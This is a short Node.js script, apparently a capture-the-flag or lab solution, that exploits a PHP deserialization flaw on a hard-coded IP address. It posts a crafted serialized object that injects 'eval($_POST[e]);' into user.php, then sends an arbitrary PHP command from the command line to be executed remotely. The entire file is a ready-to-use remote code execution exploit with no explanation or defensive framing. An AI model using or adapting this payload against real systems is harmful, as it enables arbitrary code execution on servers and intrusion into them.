const got = require('got')

const HOST = 'http://120.55.43.255:24719'

const execute = async (command) => {
  let response = await got.post(`${HOST}/user.php`, {
    form: {
      cmd: 'O:7:"convent":2:{s:4:"warn";s:16:"eval(\$_POST[e]);";}',
      e: command,
    },
  })
  return response.body
}

;(async () => {
  let command = process.argv.slice(2)[0] || 'phpinfo();'
  console.log(await execute(command))
})()
